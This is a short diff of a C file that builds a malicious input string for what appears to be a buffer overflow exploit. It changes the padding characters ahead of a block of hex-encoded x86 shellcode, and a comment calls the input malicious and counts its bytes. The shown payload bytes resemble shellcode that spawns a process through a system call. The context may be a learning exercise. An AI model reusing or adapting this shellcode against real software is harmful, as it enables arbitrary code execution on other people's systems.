@@ -6,7 +6,7 @@
 
 int main(char* argv[], int argc) {
 	//our malicious input will look something like this, containing 56 bad chars, so we need 8 padding chars minus one for the null terminator.
-	char rand_str[] = "aaaabbb"	
+	char rand_str[] = "aaaaaaa"	
 	"\xeb\x24\x5e\x89\x74\x24\x08\x31"
 	"\xc0\x88\x44\x24\x07\x89\x44\x24"
 	"\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24"
